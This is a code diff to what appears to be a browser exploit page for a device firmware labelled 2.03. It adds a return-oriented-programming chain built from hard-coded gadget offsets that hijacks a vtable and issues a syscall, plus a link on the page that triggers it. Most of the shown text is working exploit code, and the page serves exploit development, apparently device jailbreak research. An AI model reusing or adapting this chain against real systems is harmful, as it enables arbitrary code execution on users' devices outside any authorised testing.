@@ -119,7 +119,7 @@ function print_rsp_rop()
   write8(u32[0x14] - 0x2b, u32[0x15], u32[0x10] - 0x4a4cfa,u32[0x11])
 
   // mov qword ptr [rax + 0x18], rcx; ret;
-  cbuf[0] = u32[0x10] - 0x17eab23
+  cbuf[0] = u32[0x10] - (0x800000 *4) + 0x632de7
   cbuf[1] = u32[0x11]
 
   // Redirects vtable
@@ -133,9 +133,55 @@ function print_rsp_rop()
   u32[0x10] = oldvtablelow;
   u32[0x11] = oldvtablehigh;
 
-  rsp_addr =  new dcodeIO.Long(cbuf[0x6], cbuf[0x7], true)
+  rsp_addr =  new dcodeIO.Long(cbuf[0xC], cbuf[0xD], true)
   debug_log("rsp address = 0x" + rsp_addr.toString(16))
 
+}
+
+function sleep_rop()
+{
+
+  // push rax; jmp qword ptr [rax];
+  cbuf[2] = u32[0x10] - (0x800000 *1) + 0x2c39b5
+  cbuf[3] = u32[0x11]
+
+  // pop rsp; pop r14; pop r15; ret;
+  cbuf[0] = u32[0x10] - (0x800000 *4) + 0x6e9c74
+  cbuf[1] = u32[0x11]
+
+  // pop rax; ret
+  cbuf[4] = u32[0x10] - (0x800000 *1) + 0x79e5e8
+  cbuf[5] = u32[0x11]
+
+  cbuf[6] = 240
+  cbuf[7] = 0
+
+  // pop rdi; ret;
+  cbuf[8] = u32[0x10] - (0x800000 *1) + 0x37ead
+  cbuf[9] = u32[0x11]
+
+  cbuf[10] = u32[0x14] + 0x4000
+  cbuf[11] = u32[0x15]
+
+  cbuf[0x1000] = 0x5;
+
+  // pop rsi; ret;
+  cbuf[12] = u32[0x10] - (0x800000 *1) + 0x7d3445
+  cbuf[13] = u32[0x11]
+
+  cbuf[14] = 0;
+  cbuf[15] = 0;
+
+  // syscall; ret;
+  cbuf[16] = u32[0x10] - (0x800000 *1) + 0x7795d5
+  cbuf[17] = u32[0x11]
+
+  // Redirects vtable
+  u32[0x10] = u32[0x14];
+  u32[0x11] = u32[0x15];
+
+  //trigger vtable call
+  cbuf.byteLength;
 }
 
 function crash_rop()
@@ -190,6 +236,8 @@ function dump_mem()
 <script src="/scripts/long.js"></script>
 <script src="/scripts/utils.js"></script>
 <a href="javascript:print_rsp_rop()">Test ROP (2.03 Only)(prints rsp)</a>
+<br>
+<a href="javascript:sleep_rop()">Test Syscall(2.03 Only)(Sleeps 5 seconds then crashes)</a>
 <br>
 <a href="javascript:crash_rop()">Crash ROP</a>
 <div></div>
